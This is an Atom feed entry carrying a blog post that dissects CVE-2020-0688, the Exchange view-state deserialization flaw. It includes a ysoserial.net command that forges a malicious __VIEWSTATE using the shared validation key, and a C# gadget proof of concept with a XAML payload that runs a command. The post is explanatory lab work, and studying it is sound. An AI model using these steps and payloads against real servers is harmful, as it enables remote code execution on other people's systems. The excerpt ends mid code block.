<?xml version="1.0" encoding="utf-8"?>
  <feed xmlns="http://www.w3.org/2005/Atom">
    <title>Digital Self-Defense Lab</title>
    <link href="https://digital-selfdefense.net/atom.xml" rel="self"/>
    <link href="https://digital-selfdefense.net/"/>
    <updated>2020-04-11T23:33:09+02:00</updated>
    <id>https://digital-selfdefense.net</id>
    <author>
      <name></name>
      <email></email>
    </author>
    <entry>
      <title>Understanding CVE-2020-0688</title>
      <link href="https://digital-selfdefense.net/2020/04/11/Understanding-CVE-2020-0688.html"/>
      <updated>2020-04-11T12:00:00+02:00</updated>
      <id>https://digital-selfdefense.net/2020/04/11/Understanding-CVE-2020-0688</id>
      <content type="html">&lt;div class=&quot;message&quot;&gt;
        Hello, Guys! In this blog post we will take an in-depth look at CVE-2020-0688 which is a recently published vulnerability in Microsoft Exchange 
        that allows an authenticated attacker to execute arbitrary code on affected Exchange Servers.   
        &lt;/div&gt;
        &lt;p&gt;The first section of this blog post is meant as a short introduction to &lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2020-0688&lt;/code&gt;&lt;sup id=&quot;fnref:fn-CVE_2020_0688&quot;&gt;&lt;a href=&quot;#fn:fn-CVE_2020_0688&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; to lay the foundation for the great things 
        in the upcoming sections. If you are already familiar with CVE-2020-0688 you can skip the first section and jump straight into the nitty gritty details of how it works.&lt;/p&gt;
        &lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
        &lt;p&gt;On February 25th 2020 shortly after Microsoft’s Patch Tuesday, Simon Zuckerbraun from the Zero Day Initiative (ZDI&lt;sup id=&quot;fnref:fn-ZDI&quot;&gt;&lt;a href=&quot;#fn:fn-ZDI&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;) published a write-up of CVE-2020-0688 a remote code execution
        vulnerability in Microsoft Exchange that was reported anonymously to ZDI. The anonymous researcher discovered that Microsoft Exchange uses the same cryptographic keys across all installations. This poses a serious risk for the authenticity and integrity of the view state used by the ASP.NET web application included in Microsoft Exchange.&lt;/p&gt;
        &lt;p&gt;ASP.NET web applications like the Exchange Control Panel (ECP) make use of the view state mechanism to maintain a page state and persist data in web forms on postbacks. The view state is saved as a hidden form field (&lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt;) in the document object model (DOM) delivered by the ASP.NET server to the client (Browser). During the communication between an ASP.NET server and a client the view state is send back and forth between these two parties (NSA not included ;-)). Because HTTP is stateless it wouldn’t be possible for the ASP.NET server to reconstruct the state of web controls after postbacks if there wasn’t the view state.&lt;/p&gt;
        &lt;p&gt;Another important aspect about the view state is that it gets deserialized on the server-side. Due to this reason it is essential that the client is unable to tamper with the view state, otherwise this would lead to remote code execution on the ASP.NET server. In order to protect the view state from tampering it’s authenticity and integrity is protected by a Keyed-Hash Message Authentication Code (HMAC) (in some cases the view state is even encrypted). In the case of Microsoft Exchange the same key is used to protect the authenticity and integrity across diffrent installations of Microsoft Exchange, which allows the attacker to forge a valid view state that will get deserialized by the server.&lt;/p&gt;
        &lt;h2 id=&quot;exploitation-stages&quot;&gt;Exploitation Stages&lt;/h2&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/1.png&quot; alt=&quot;Figure 1: Exploitation Stages&quot; title=&quot;Exploitation Stages&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;In the diagram above you can see an overview of the different stages that the attacker has to go through in order to exploit CVE-2020-0688. The upcoming sections of this blog post are structured based on three stages presented here.&lt;/p&gt;
        &lt;h2 id=&quot;lab-setup&quot;&gt;Lab Setup&lt;/h2&gt;
        &lt;p&gt;If you are excited to play around with the public exploits available for CVE-2020-0688 and you are not currently planing to go to jail, it is necessary to setup a vulnerable Microsoft Exchange Server. The following listing shows the lab setup that was used by the author to create the blog post you are currently reading.&lt;/p&gt;
        &lt;ol&gt;
        &lt;li&gt;Windows Server 2012 R2&lt;/li&gt;
        &lt;li&gt;Microsoft Exchange 2013&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/exchange/exchange-2013-prerequisites-exchange-2013-help&quot;&gt;Exchange 2013 Prerequisites&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net: .NET payload generator for deserialization&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;https://github.com/0xd4d/dnSpy&quot;&gt;dnSpy: .NET Debugger&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;/assets/uploads/2020/04/post1/files/Test.cs&quot;&gt;TextFormattingRunProperties POC&lt;/a&gt;&lt;/li&gt;
        &lt;/ol&gt;
        &lt;p&gt;&lt;cite&gt;DISCLAIMER: Never use the content presented on this website to break any laws! If you don’t play by the rules there won’t be any christmas presents this year.&lt;/cite&gt;&lt;/p&gt;
        &lt;h2 id=&quot;collect&quot;&gt;Collect&lt;/h2&gt;
        &lt;p&gt;Before you can exploit Microsoft Exchange Servers vulnerable to CVE-2020-0688 a few preconditions need to be satisfied:&lt;/p&gt;
        &lt;ol&gt;
        &lt;li&gt;Know the &lt;code class=&quot;highlighter-rouge&quot;&gt;validationKey&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;decryptionKey&lt;/code&gt; from the &lt;code class=&quot;highlighter-rouge&quot;&gt;web.config&lt;/code&gt; file of your target (those values are public)&lt;/li&gt;
        &lt;li&gt;Know the ASP.NET version in use by the target (View state algorithms differ between ASP.NET versions)&lt;/li&gt;
        &lt;li&gt;Get valid credentials to access the Exchange Control Panel (ECP) of the target&lt;/li&gt;
        &lt;li&gt;Login to the ECP &lt;code class=&quot;highlighter-rouge&quot;&gt;/ecp/default.aspx&lt;/code&gt; and collect the ASP.NET SessionId Cookie value&lt;/li&gt;
        &lt;li&gt;While still logged in collect the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; value from the DOM returned by requesting ECP&lt;/li&gt;
        &lt;/ol&gt;
        &lt;p&gt;The first point from the list is easly satisfied because the &lt;code class=&quot;highlighter-rouge&quot;&gt;validationKey&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;decryptionKey&lt;/code&gt; values are the same for all vulnerable Microsoft Exchange Servers. For the sake of completness below you can find the contents of the &lt;code class=&quot;highlighter-rouge&quot;&gt;web.config&lt;/code&gt; file used in the lab setup described in the previous section. The keys and algorithms defined in the &lt;code class=&quot;highlighter-rouge&quot;&gt;web.config&lt;/code&gt; file play an important role during the runtime of an ASP.NET web application. They are managed by an &lt;code class=&quot;highlighter-rouge&quot;&gt;MachineKeySection&lt;/code&gt; object which according to MSDN is responsible for the following tasks:&lt;/p&gt;
        &lt;p&gt;&lt;cite&gt;“Defines the configuration settings that control the key generation and algorithms that are used in encryption, decryption, and message authentication code (MAC) operations in Windows Forms authentication, view-state validation, and session-state application isolation.”&lt;/cite&gt;.&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/2.png&quot; alt=&quot;Figure 2: web.config&quot; title=&quot;web.config&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;MachineKeySection&lt;/code&gt; class provides a method called &lt;code class=&quot;highlighter-rouge&quot;&gt;GetEncodedData()&lt;/code&gt; which we will later use to forge the malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; as you we will see in the next section.&lt;/p&gt;
        &lt;p&gt;Secondly, you need to know the ASP.NET version of the target in order to be able to forge a valid view state which gets accepted by an vulnerable Microsoft Exchange Server. This is important because the view state of ASP.NET version &amp;lt; 4.5 (legacy) and ASP.NET version &amp;gt;= 4.5 (new) are computed differently. How to get the ASP.NET version of a remote system you might ask? My answer is &lt;cite&gt;“enumerate, enumerate, enumerate, …”&lt;/cite&gt; until you find it. For my lab machine the ASP.NET version can be seen in the figure below. But please don’t hack me ;-).&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/3.png&quot; alt=&quot;Figure 3: ASP.NET Version&quot; title=&quot;ASP.NET Version&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;The third condition from the list is the hardest to satisfy, because it requires you to have valid credentials to access one of the maliboxes of the target. Keep in mind that the account used doesn’t need to have any special privileges, therefore chances are quite high that you might get lucky during your pentest journey.&lt;/p&gt;
        &lt;p&gt;The fourth condition from our list requires you to capture the ASP.NET SessionId Cookie assigned to your user during login. This can be achived by looking at the HTTP-Headers in the network tab of the debugging tools of your browser.&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;// viewStateUserKey is normally the anti-CSRF parameter unless it is the same for all users! 
        if (viewStateUserKey != null)
        {
        int count = Encoding.Unicode.GetByteCount(viewStateUserKey);
        _macKeyBytes = new byte[count + 4];
        Encoding.Unicode.GetBytes(viewStateUserKey, 0, viewStateUserKey.Length, _macKeyBytes, 4);
        }
        _macKeyBytes[0] = (byte)pageHashCode;
        _macKeyBytes[1] = (byte)(pageHashCode &amp;gt;&amp;gt; 8);
        _macKeyBytes[2] = (byte)(pageHashCode &amp;gt;&amp;gt; 16);
        _macKeyBytes[3] = (byte)(pageHashCode &amp;gt;&amp;gt; 24);
        ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;The value from the ASP.NET SessionId Cookie represents the &lt;code class=&quot;highlighter-rouge&quot;&gt;viewStateUserKey&lt;/code&gt; which is used as a CSRF mitigation as can be seen in the source code snippet of the view state plugin (&lt;code class=&quot;highlighter-rouge&quot;&gt;../ysoserial/Plugins/ViewStatePlugin.cs&lt;/code&gt;&lt;sup id=&quot;fnref:fn-yososerial_ViewStatePlugin&quot;&gt;&lt;a href=&quot;#fn:fn-yososerial_ViewStatePlugin&quot; class=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;). Note that the &lt;code class=&quot;highlighter-rouge&quot;&gt;viewStateUserKey&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;pageHashCode&lt;/code&gt;) are added to the &lt;code class=&quot;highlighter-rouge&quot;&gt;__macKeyBytes&lt;/code&gt; array that later on is used as input for the HMAC computation.&lt;/p&gt;
        &lt;p&gt;Finally we need to collect the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; value from the Document Object Model (DOM) of the previously requested Exchange Control Panel (ECP). Think of the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; as a unique hash representation of the web path requested. This hash value is calculated with the help of the &lt;code class=&quot;highlighter-rouge&quot;&gt;GetNonRandomizedHashCode&lt;/code&gt; function which can be found in the &lt;code class=&quot;highlighter-rouge&quot;&gt;System.Web.Util.StringUtil&lt;/code&gt; class. The inputs for the function are the IIS path (e.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt;) and the path of the requested page (e.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;/ecp/default.aspx&lt;/code&gt;). The &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; value combined with the &lt;code class=&quot;highlighter-rouge&quot;&gt;viewStateUserKey&lt;/code&gt; described in the paragraph before are part of the HMAC computation performed while creating a view state.&lt;/p&gt;
        &lt;p&gt;With the help of the cryptographic parameters &lt;code class=&quot;highlighter-rouge&quot;&gt;viewStateUserKey&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; the following properites are achived by the ASP.NET web application:&lt;/p&gt;
        &lt;ul&gt;
        &lt;li&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;viewStateUserKey&lt;/code&gt; is unique for each user session and is included in the computation of the view state HMAC. Because the &lt;code class=&quot;highlighter-rouge&quot;&gt;viewStateUserKey&lt;/code&gt; is kept secret the attacker is not able to know its value  beforehand. Therefore it is impossible for the attacker to create a web form that will trick a victim into requesting a certain action from the backend because that would require the attacker to be able to compute the view state. This provides a sufficient protection against CSRF attacks.&lt;/li&gt;
        &lt;li&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; (part of HMAC computation) restricts the view state to the web application it originated from. Therefore it’s not possible to reply the view state of an established session to other parts of the ASP.NET web application.&lt;/li&gt;
        &lt;/ul&gt;
        &lt;h2 id=&quot;forge&quot;&gt;Forge&lt;/h2&gt;
        &lt;p&gt;After collecting all necessary cryptographic parameters it’s time to forge a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; by using a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt;. According to the description found on the projects github page, &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt;&lt;sup id=&quot;fnref:fn-github_yoserialnet&quot;&gt;&lt;a href=&quot;#fn:fn-github_yoserialnet&quot; class=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; is &lt;cite&gt;“A proof-of-concept tool for generating payloads that exploit unsafe .NET object deserialization”&lt;/cite&gt;.&lt;/p&gt;
        &lt;p&gt;The cool part about &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt; is that it contains a plugin called &lt;code class=&quot;highlighter-rouge&quot;&gt;ViewStatePlugin.cs&lt;/code&gt; that is able to generate view states for ASP.NET version &amp;lt; 4.5 (legacy) and ASP.NET version &amp;gt;= 4.5 (new). In the following you can see how we use the tool &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt; in combination with the previously collected cryptographic parameters to forge a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt;.&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;ysoserial.exe --plugin=&quot;ViewState&quot; --islegacy
        --validationalg=&quot;SHA1&quot; 
        --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot;
        --viewstateuserkey=&quot;05ae4b41-51e1-4c3a-9241-6b87b169d663&quot;
        --generator=&quot;B97B4E27&quot;
        --gadget=&quot;TextFormattingRunProperties&quot;
        --command=&quot;calc.exe&quot; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;In the first argument we specify the view state plugin which tells &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt; that we want to forge a &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt;. The second argument tells &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt; the type of &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; we want to forge. We want to generate a legacy &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; because the ASP.NET version in our lab environment is 4.0 and therefore the view state needs to be in legacy format.&lt;/p&gt;
        &lt;p&gt;The following two arguments represent the fixed cryptographic parameters which are the root cause of CVE-2020-0688. Note that the hash algorithm used to compute the HMAC of the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;SHA1&lt;/code&gt;. This means that the integrity and authenticity of the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; is protected by a Keyed-Hash Message Authentication Code (HMAC) base on &lt;code class=&quot;highlighter-rouge&quot;&gt;SHA1&lt;/code&gt;. The key used to ensure the authenticity is the &lt;code class=&quot;highlighter-rouge&quot;&gt;ValidationKey&lt;/code&gt;. As mentioned earlier the &lt;code class=&quot;highlighter-rouge&quot;&gt;ValidationKey&lt;/code&gt; is the same for all vulnerable Microsoft Exchange Servers, which is the reason why this vulnerablity exists.&lt;/p&gt;
        &lt;p&gt;The next two arguments are the &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATEGENERATOR&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;ViewStateUserKey&lt;/code&gt;. Both values have been collected after logging into the ASP.NET web application (e.g. ECP) part of the vulnerable  Exchange Server. If you are not familiar with the purpouse of the two arguments I recommend you to go back to the previous section and refresh your memory. The one importat thing to remember for now is that the two arguments are part of the HMAC computation.&lt;/p&gt;
        &lt;p&gt;Now it’s time to look into the view state plugin included in &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt;, so we are able to see exactly how a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; is generated.&lt;/p&gt;
        &lt;p&gt;The plugin is located under &lt;code class=&quot;highlighter-rouge&quot;&gt;/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs&lt;/code&gt;.&lt;/p&gt;
        &lt;p&gt;If you browse through &lt;code class=&quot;highlighter-rouge&quot;&gt;ViewStatePlugin.cs&lt;/code&gt; you will notice that the function responsible for generating the malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; is the one called &lt;code class=&quot;highlighter-rouge&quot;&gt;generateViewStateLegacy_2_to_4()&lt;/code&gt;. In the code listing below you can see a number of functions that are called from &lt;code class=&quot;highlighter-rouge&quot;&gt;generateViewStateLegacy_2_to_4()&lt;/code&gt; to generate the malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt;.&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;generateViewStateLegacy_2_to_4()
        |
        +-&amp;gt; MachineKeySection.GetEncodedData()
        |
        +-&amp;gt; MachineKeySection.HashData()
        |
        +-&amp;gt; MachineKeySection.GetHMACSHA1Hash()
        |
        +-&amp;gt; UnsafeNativeMethods.GetHMACSHA1Hash()	&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;The first thing you see when looking at some of the functions called by &lt;code class=&quot;highlighter-rouge&quot;&gt;generateViewStateLegacy_2_to_4()&lt;/code&gt; is that they clearly have something to do with the HMAC computation. Another important detail to notice is that the functions are from the &lt;code class=&quot;highlighter-rouge&quot;&gt;MachineKeySection&lt;/code&gt;&lt;sup id=&quot;fnref:fn-microsoft_MachineKeySection&quot;&gt;&lt;a href=&quot;#fn:fn-microsoft_MachineKeySection&quot; class=&quot;footnote&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; class which according to MSDN is responsible for handling view-state validation, &lt;cite&gt;“Defines the configuration settings that control the key generation and algorithms that are used in encryption, decryption, and message authentication code (MAC) operations in Windows Forms authentication, view-state validation, and session-state application isolation.”&lt;/cite&gt;.&lt;/p&gt;
        &lt;p&gt;The malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; is nothing more than a serialized and base64 encoded &lt;code class=&quot;highlighter-rouge&quot;&gt;Gadget&lt;/code&gt; (we will come back to this later) combined with an HMAC computed from the &lt;code class=&quot;highlighter-rouge&quot;&gt;Gadget&lt;/code&gt; itself and the cryptographic parameters collected in the first stage of our attack.&lt;/p&gt;
        &lt;p&gt;The diagram below should help you to understand how the HMAC is generated by &lt;code class=&quot;highlighter-rouge&quot;&gt;generateViewStateLegacy_2_to_4()&lt;/code&gt; based on the &lt;code class=&quot;highlighter-rouge&quot;&gt;Gadget&lt;/code&gt; and the cryptographic parameters provided to the function.&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/4.png&quot; alt=&quot;Figure 4: SHA1 HMAC&quot; title=&quot;SHA1 HMAC&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;Finally the HMAC above is appended to the serialized and base64 encoded &lt;code class=&quot;highlighter-rouge&quot;&gt;Gadget&lt;/code&gt; which represents the malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; as shown in the following diagram.&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/5.png&quot; alt=&quot;Figure 5: Malicious __VIEWSTATE&quot; title=&quot;Malicious __VIEWSTATE&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;At this point you might have noticed that there are still two arguments left from the &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt; commandline that need some explanation. Those two arguments will be covered in greater detail the upcoming section.&lt;/p&gt;
        &lt;h2 id=&quot;smash&quot;&gt;Smash&lt;/h2&gt;
        &lt;p&gt;In the previous section we introduced the vast majority of arguments required by the tool &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial.net&lt;/code&gt; to forge a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; with the exception of the two arguments &lt;code class=&quot;highlighter-rouge&quot;&gt;gadget&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;command&lt;/code&gt;. These two arguments are responsible for providing a means of code execution as we will see in the following paragraphs.&lt;/p&gt;
        &lt;p&gt;Before we continue let’s remember that our final goal is to execute code on the vulnerable Microsoft Exchange Server, which requires us to send the server a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; that, when deserialized on the server-side leads to code execution.&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;ysoserial.exe ...
        --gadget=&quot;TextFormattingRunProperties&quot;
        --command=&quot;calc.exe&quot; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;The last argument from the above commandline which is named &lt;code class=&quot;highlighter-rouge&quot;&gt;command&lt;/code&gt;, is responsible for what gets executed when our malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; is deserialized by the server-side. For demonstration purpouses &lt;code class=&quot;highlighter-rouge&quot;&gt;calc.exe&lt;/code&gt; is used as our final payload but in general the value is only limited by the imagination of the attacker.&lt;/p&gt;
        &lt;p&gt;But what about this mysterious argument named &lt;code class=&quot;highlighter-rouge&quot;&gt;gadget&lt;/code&gt; which has &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; as its value? As you might have guessed by now the actual magic lies in the class called &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt;.&lt;/p&gt;
        &lt;p&gt;Classes like &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; are regular building blocks of the .NET-Framework with the exception that they provide an indirect (often not intended) way of enabling code execution during deserialization.&lt;/p&gt;
        &lt;p&gt;When deserializing an serialized object of the type &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; a chain of methods is called on its properties which finally leads to code execution. In technical terms this is often referred to as &lt;code class=&quot;highlighter-rouge&quot;&gt;Gadget chain&lt;/code&gt;. Now let’s take a look at how this gadget can help us in achieving code execution on our Microsoft Exchange Server.&lt;/p&gt;
        &lt;p&gt;To demonstrate to you what happens when an object of type &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; gets deserialized we will take a look at a proof-of-concept code borrowed from the finders of the gadget Alvaro Muñoz and Oleksandr Mirosh&lt;sup id=&quot;fnref:fn-New_Gadget&quot;&gt;&lt;a href=&quot;#fn:fn-New_Gadget&quot; class=&quot;footnote&quot;&gt;6&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
        &lt;p&gt;The class below implements the interface &lt;code class=&quot;highlighter-rouge&quot;&gt;ISerializable&lt;/code&gt; which tells us that objects of this type will use a custom way of serialization. When serialzing an object the &lt;code class=&quot;highlighter-rouge&quot;&gt;GetObjectData&lt;/code&gt; method is called implcitly. Inside this method we specify the property &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt; as part of the &lt;code class=&quot;highlighter-rouge&quot;&gt;SerializationInfo&lt;/code&gt; object. According to MSDN the &lt;code class=&quot;highlighter-rouge&quot;&gt;SerializationInfo&lt;/code&gt; class is responsible for the storage of all the data that is needed to serialize or deserialize an object. Also note that the type of &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt; is defined as &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; and that it uses the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;_xaml&lt;/code&gt; as its value.&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[Serializable]
        public class TextFormattingRunPropertiesMarshal : ISerializable
        {
        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
        Type t = Type.GetType(&quot;Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, 
        Microsoft.PowerShell.Editor, 
        Version=3.0.0.0, 
        Culture=neutral, 
        PublicKeyToken=31bf3856ad364e35&quot;);
        info.SetType(t);
        info.AddValue(&quot;ForegroundBrush&quot;, _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
        _xaml = xaml;
        }
        }	&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;The complete source code of this example can be found &lt;a href=&quot;/assets/uploads/2020/04/post1/files/Test.cs&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
        &lt;p&gt;Before we are able to execute arbitrary commands with the help of the class presented above we first need to define the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;payload&lt;/code&gt; of type &lt;code class=&quot;highlighter-rouge&quot;&gt;string&lt;/code&gt; which will contain the following XAML. If this doesn’t make any sense to you right now don’t worry we will shortly provide you with an detailed explanation of whats going on here.&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;
        xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;
        xmlns:System=&quot;clr-namespace:System;assembly=mscorlib&quot;
        xmlns:Diag=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&amp;gt;
        &amp;lt;ObjectDataProvider x:Key=&quot;RunCalc&quot; ObjectType = &quot;{ x:Type Diag:Process }&quot; MethodName = &quot;Start&quot;&amp;gt;
        &amp;lt;ObjectDataProvider.MethodParameters&amp;gt;
        &amp;lt;System:String&amp;gt;cmd&amp;lt;/System:String&amp;gt;
        &amp;lt;System:String&amp;gt;/c calc.exe &amp;lt;/System:String&amp;gt;
        &amp;lt;/ObjectDataProvider.MethodParameters&amp;gt;
        &amp;lt;/ObjectDataProvider&amp;gt;
        &amp;lt;/ResourceDictionary&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;What follows next is that we create an object of type &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunPropertiesMarshal&lt;/code&gt; and provide its constructor the previously defined &lt;code class=&quot;highlighter-rouge&quot;&gt;payload&lt;/code&gt; variable which contains the XAML specified above. In the subsequent lines we see how the object is first serialized and then deserialized immediately. For the purpouse of serialization/deserialization we use the class &lt;code class=&quot;highlighter-rouge&quot;&gt;LosFormatter&lt;/code&gt;&lt;sup id=&quot;fnref:fn-microsoft_LosFormatter&quot;&gt;&lt;a href=&quot;#fn:fn-microsoft_LosFormatter&quot; class=&quot;footnote&quot;&gt;7&lt;/a&gt;&lt;/sup&gt;. This class is used by ASP.NET web applications to serialize/deserialize the view state.&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Object obj = new TextFormattingRunPropertiesMarshal(payload);
        LosFormatter fmt = new LosFormatter();
        MemoryStream ms = new MemoryStream();
        fmt.Serialize(ms, obj);
        ms.Position = 0;
        fmt.Deserialize(ms);&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;When you compile and execute the binary from this c-sharp proof-of-conecept code (POC) a calculator will somehow magically appear as can be seen in the following figure.&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/6.png&quot; alt=&quot;Figure 6: TextFormattingRunProperties Gadget&quot; title=&quot;TextFormattingRunProperties Gadget&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;In order to understand what happened until this point we need to take a step back and look at some of the properties of the gadget &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt;. The first thing to notice when looking at the gadget class is that it contains a &lt;code class=&quot;highlighter-rouge&quot;&gt;Serializable&lt;/code&gt; attribute and that the class implements an interface of type &lt;code class=&quot;highlighter-rouge&quot;&gt;ISerializable&lt;/code&gt;. This tells us that the gadget class will implement a custom form of serialization/deserialization.&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[System.Serializable]
